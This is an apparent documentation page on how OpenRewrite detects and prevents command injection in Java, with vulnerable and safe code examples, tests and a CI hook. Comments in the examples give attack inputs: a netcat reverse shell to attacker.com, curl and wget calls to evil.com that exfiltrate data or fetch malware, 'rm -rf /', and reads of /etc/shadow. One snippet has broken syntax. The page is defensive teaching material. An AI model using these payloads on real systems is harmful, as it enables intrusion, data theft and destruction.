---
description: Detect and prevent command injection vulnerabilities in Java applications.
---

# Command injection detection

Command injection vulnerabilities occur when untrusted data is passed to system commands, allowing attackers to execute arbitrary commands on the host operating system. This can lead to complete system compromise, data theft, or service disruption.

## Understanding command injection

Command injection is like handing your house keys to a stranger when they asked to borrow a pen. When your application executes system commands with user input, you're essentially letting users type commands directly into your server's terminal. An attacker can chain their own commands onto yours, turning a simple file operation into a full system compromise.

### The danger illustrated

A single vulnerable line of code can destroy your entire system. This example shows how an innocent-looking file viewer becomes a weapon for attackers:

```java
// VULNERABLE: User input directly in command
String filename = request.getParameter("file");
Process p = Runtime.getRuntime().exec("cat /logs/" + filename);

// Attack: file = "access.log; rm -rf /; echo"
// Executes: cat /logs/access.log; rm -rf /; echo
// Result: Attempts to delete everything!
```

## How OpenRewrite detects command injection

The `FindCommandInjection` recipe tracks untrusted data flowing into command execution methods:

### 1. Command execution sinks

These are the Java methods that actually run system commands. Think of them as the bridges between your Java application and the operating system's command line. OpenRewrite watches for untrusted data flowing into any of these methods:

```java
// Runtime execution
Runtime.getRuntime().exec(command)
Runtime.getRuntime().exec(commandArray)

// ProcessBuilder
new ProcessBuilder(commands).start()
new ProcessBuilder().command(commands).start()

// Apache Commons Exec
CommandLine cmdLine = CommandLine.parse(command)
DefaultExecutor executor = new DefaultExecutor()
executor.execute(cmdLine)
```

### 2. Common attack vectors

Attackers use special shell characters to break out of your intended command and inject their own. These characters act like escape hatches, allowing attackers to end your command and start their own malicious ones:

```java
// Shell metacharacters that enable command chaining
; && || | ` $() > < >> << & \n \r

// Example attacks:
"file.txt; cat /etc/passwd"          // Command chaining
"file.txt && curl evil.com/steal"    // Conditional execution  
"file.txt | mail attacker@evil.com"  // Pipe to another command
"$(cat /etc/passwd)"                 // Command substitution
"`rm -rf /`"                         // Backtick execution
```

## Vulnerable patterns

### Basic command injection

The most common mistake is concatenating user input directly into a command string. It's tempting because it's simple, but it's also catastrophically dangerous:

```java
// VULNERABLE - Direct concatenation
@PostMapping("/backup")
public String backup(@RequestParam String directory) {
    String command = "tar -czf backup.tar.gz " + directory;
    Process p = Runtime.getRuntime().exec(command);
    return "Backup created";
}
// Attack: directory = "/home/user; cat /etc/shadow > public/passwords.txt"
```

### Array-based commands (still vulnerable)

Many developers think using array syntax makes them safe from injection. Unfortunately, if you're still invoking a shell with `sh -c`, you're still vulnerable. The shell will interpret special characters regardless of how you pass them:

```java
// VULNERABLE - Even with array syntax
@GetMapping("/ping")
public String ping(@RequestParam String host) {
    String[] command = {"sh", "-c", "ping -c 4 " + host};
    Process p = Runtime.getRuntime().exec(command);
    return readOutput(p);
}
// Attack: host = "google.com; nc -e /bin/sh attacker.com 4444"
```

### ProcessBuilder vulnerabilities

ProcessBuilder is Java's newer, safer way to run commands – but only if you use it correctly. When you invoke a shell through ProcessBuilder, you're right back to square one with injection vulnerabilities:

```java
// VULNERABLE - ProcessBuilder with shell
@PostMapping("/convert")
public void convertFile(@RequestParam String input, @RequestParam String output) {
    List<String> command = Arrays.asList("sh", "-c", 
        "ffmpeg -i " + input + " " + output);
    new ProcessBuilder(command).start();
}
// Attack: input = "video.mp4; wget evil.com/malware.sh; sh malware.sh;"
```

### Path traversal in commands

Combining path traversal with command injection creates a double threat. Attackers can both escape your intended directory and execute arbitrary commands:

```java
// VULNERABLE - Path traversal + command injection
@GetMapping("/logs")
public String viewLog(@RequestParam String logfile) {
    String command = "tail -n 100 /var/log/" + logfile;
    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
    return readOutput(p);
}
// Attack: logfile = "../../../etc/passwd; echo 'hacked' > /var/www/index.html"
```

## Safe patterns and remediation

### Avoid shell invocation

The golden rule of command execution: never invoke a shell unless absolutely necessary. When you bypass the shell and execute commands directly, special characters lose their power. They become just regular characters that can't break out of your command:

```java
// SAFE - Direct command without shell
@GetMapping("/disk-usage")
public String diskUsage(@RequestParam String directory) {
    // Validate input first
    if (!isValidDirectory(directory)) {
        throw new IllegalArgumentException("Invalid directory");
    }
    
    // Use array form without shell
    String[] command = {"du", "-sh", directory};
    Process p = Runtime.getRuntime().exec(command);
    return readOutput(p);
}

// SAFE - ProcessBuilder without shell
@PostMapping("/compress")
public void compressFile(@RequestParam String filename) {
    // Whitelist validation
    if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
        throw new IllegalArgumentException("Invalid filename");
    }
    
    ProcessBuilder pb = new ProcessBuilder(
        "gzip", 
        "-9", 
        "/safe/path/" + filename
    );
    pb.start();
}
```

### Input validation and sanitization

Sometimes you genuinely need shell features like pipes or wildcards. In these rare cases, treat user input like a ticking time bomb. Validate everything, trust nothing, and maintain a strict allowlist of safe characters:

```java
public class CommandSanitizer {
    // Whitelist allowed characters
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9._/-]+$");
    
    // Dangerous shell metacharacters
    private static final Set<String> DANGEROUS_CHARS = Set.of(
        ";", "&&", "||", "|", "`", "$", "(", ")", 
        ">", "<", "&", "\n", "\r", "*", "?", "[", "]"
    );
    
    public static String sanitize(String input) {
        // Reject if contains dangerous characters
        for (String dangerous : DANGEROUS_CHARS) {
            if (input.contains(dangerous)) {
                throw new IllegalArgumentException("Invalid characters in input");
            }
        }
        
        // Only allow whitelisted characters
        if (!SAFE_PATTERN.matcher(input).matches()) {
            throw new IllegalArgumentException("Input contains invalid characters");
        }
        
        return input;
    }
}
```

### Use higher-level APIs

Why call out to the operating system when Java can do it natively? Using Java's built-in file and process APIs eliminates command injection entirely. Plus, your code becomes more portable and often runs faster:

```java
// INSTEAD OF: Runtime.exec("mkdir -p " + path)
// USE:
Files.createDirectories(Paths.get(path));

// INSTEAD OF: Runtime.exec("cp " + src + " " + dst)  
// USE:
Files.copy(Paths.get(src), Paths.get(dst));

// INSTEAD OF: Runtime.exec("rm -f " + file)
// USE:
Files.deleteIfExists(Paths.get(file));

// INSTEAD OF: Runtime.exec("find " + dir + " -name " + pattern)
// USE:
Files.walk(Paths.get(dir))
     .filter(path -> path.getFileName().toString().matches(pattern))
     .collect(Collectors.toList());
```

### Parameterized commands

When you absolutely must run external commands, treat them like SQL prepared statements. Define command templates with placeholders, then safely substitute validated values. This pattern prevents injection while still allowing flexibility:

```java
public class SafeCommandExecutor {
    private static final Map<String, String[]> ALLOWED_COMMANDS = Map.of(
        "compress", new String[]{"gzip", "-9", "{}"},
        "backup", new String[]{"tar", "-czf", "{output}", "{input}"},
        "scan", new String[]{"clamscan", "--no-summary", "{}"}
    );
    
    public void executeCommand(String commandName, Map<String, String> params) {
        String[] template = ALLOWED_COMMANDS.get(commandName);
        if (template == null) {
            throw new IllegalArgumentException("Unknown command");
        }
        
        // Replace placeholders with validated parameters
        String[] command = Arrays.stream(template)
            .map(part -> replacePlaceholder(part, params))
            .toArray(String[]::new);
            
        new ProcessBuilder(command).start();
    }
    
    private String replacePlaceholder(String part, Map<String, String> params) {
        if (part.startsWith("{") && part.endsWith("}")) {
            String key = part.substring(1, part.length() - 1);
            String value = params.get(key);
            if (value == null) {
                throw new IllegalArgumentException("Missing parameter: " + key);
            }
            return sanitize(value);
        }
        return part;
    }
}
```

## Advanced detection features

### Context-aware analysis

OpenRewrite doesn't just look at individual lines — it follows data as it flows through your entire application. Tainted data remains tainted no matter how many methods it passes through, ensuring that laundering attempts don't hide vulnerabilities:

```java
// Tracks through method calls
public void processFile(HttpServletRequest request) {
    String filename = request.getParameter("file");  // TAINTED
    executeCommand(filename);
}

private void executeCommand(String file) {
    String cmd = buildCommand(file);  // Taint propagated
    Runtime.getRuntime().exec(cmd);   // VULNERABILITY detected
}

private String buildCommand(String input) {
    return "process " + input;  // Taint flows through
}
```

### Detecting laundered input

Partial sanitization is often worse than no sanitization — it gives a false sense of security. Attackers have dozens of ways to inject commands, and if you only block a few, you're still vulnerable:

```java
// STILL VULNERABLE - Incomplete sanitization
public void execute(String userInput) {
    // This only removes some dangerous characters
    String "cleaned" = userInput.replace(";", "")
                               .replace("|", "")
                               .replace("&", "");
    
    // But what about $(), ``, \n, etc.?
    Runtime.getRuntime().exec("echo " + cleaned);  // Still vulnerable!
}
```

## Platform-specific considerations

### Windows vs. Unix commands

Command injection isn't one-size-fits-all. Windows and Unix systems have different shells with different special characters. Your validation needs to account for the platform where your code will run:

```java
public class PlatformAwareValidator {
    public boolean isSafeForPlatform(String input) {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            // Windows-specific dangerous characters
            return !input.matches(".*[&|<>^%].*");
        } else {
            // Unix-specific dangerous characters  
            return !input.matches(".*[;&|<>`$(){}\\[\\]\\n\\r].*");
        }
    }
}
```

### Docker and container commands

Containers add another layer of complexity to command injection. When you're building Docker commands dynamically, you're not just risking the container — you might be exposing the host system too:

```java
// VULNERABLE - Docker command injection
@PostMapping("/container/run")
public void runContainer(@RequestParam String image, @RequestParam String cmd) {
    String dockerCmd = "docker run " + image + " " + cmd;
    Runtime.getRuntime().exec(new String[]{"sh", "-c", dockerCmd});
}
// Attack: image = "ubuntu; docker run -v /:/host --privileged ubuntu sh -c 'cat /host/etc/shadow'"
```

## Testing command injection detection

### Unit tests

Testing your command injection detection ensures you catch vulnerabilities during development, not after deployment. These tests demonstrate patterns that should trigger warnings and safe patterns that shouldn't:

```java
@Test
void detectsBasicCommandInjection() {
    rewriteRun(
        java("""
            import java.io.*;
            
            class CommandExecutor {
                void executeUserCommand(String userInput) throws IOException {
                    ~~>Runtime.getRuntime().exec("ls " + userInput);
                }
            }
            """)
    );
}

@Test
void allowsSafeCommandExecution() {
    rewriteRun(
        java("""
            import java.io.*;
            
            class SafeExecutor {
                void listDirectory() throws IOException {
                    // Fixed command, no user input
                    Runtime.getRuntime().exec(new String[]{"ls", "-la", "/tmp"});
                }
            }
            """)
    );
}

@Test
void detectsProcessBuilderInjection() {
    rewriteRun(
        java("""
            import java.util.*;
            
            class ProcessExecutor {
                void runProcess(String userArg) throws IOException {
                    List<String> command = Arrays.asList("sh", "-c", "echo " + userArg);
                    ~~>new ProcessBuilder(command).start();
                }
            }
            """)
    );
}
```

## Common false positives

### Environment variables

Environment variables from the system are generally safer than user input, but they can still be manipulated in some contexts. The key is understanding your threat model and coding defensively:

```java
// May be flagged but could be safe if properly controlled
String javaHome = System.getenv("JAVA_HOME");
Process p = Runtime.getRuntime().exec(javaHome + "/bin/java -version");

// Better approach:
Path javaPath = Paths.get(System.getenv("JAVA_HOME"), "bin", "java");
Process p = Runtime.getRuntime().exec(new String[]{javaPath.toString(), "-version"});
```

### Configuration-based commands

Commands from configuration files might be flagged even though they're relatively safe. The safety depends on who controls the configuration and how it's protected:

```java
// From trusted configuration file
@Value("${app.backup.command}")
private String backupCommand;  // e.g., "/usr/bin/backup.sh"

public void runBackup() {
    // If configuration is trusted, this might be safe
    Runtime.getRuntime().exec(backupCommand);
}
```

## Severity and impact

Command injection is typically a **CRITICAL** severity vulnerability because:

1. **Complete System Compromise**: Attackers can execute any command the application can
2. **Data Exfiltration**: Access to all files the application can read
3. **Service Disruption**: Ability to delete files, kill processes, or consume resources
4. **Lateral Movement**: Pivot point for attacking other systems
5. **Privilege Escalation**: Potential to exploit SUID binaries or misconfigurations

## Real-world examples

Several major vulnerabilities have been command injection:

* **Shellshock (2014)**: Bash vulnerability allowing command injection via environment variables
* **ImageMagick (2016)**: Command injection through image processing
* **Log4Shell (2021)**: While primarily JNDI injection, often led to command execution

## Integration with CI/CD

### Pre-commit hook

Catching command injection before code reaches your repository is your first line of defense. This simple git hook runs OpenRewrite's detection automatically and blocks commits containing vulnerabilities:

```bash
#!/bin/bash
# .git/hooks/pre-commit

# Run command injection detection
mvn rewrite:run -Drecipe=org.openrewrite.analysis.java.security.FindCommandInjection

if [ $? -ne 0 ]; then
    echo "Command injection vulnerability detected. Commit blocked."
    exit 1
fi
```

## Next steps

* [SQL Injection](./sql-injection.md) - Similar pattern for database commands
* [LDAP Injection](./ldap-injection.md) - Directory service command injection
* [Path Traversal](./path-traversal.md) - File system access vulnerabilities

:::danger Critical Security Issue
Command injection is one of the most dangerous vulnerabilities. Always validate input, avoid shell invocation when possible, and use parameterized commands. Never trust user input in system commands.
:::
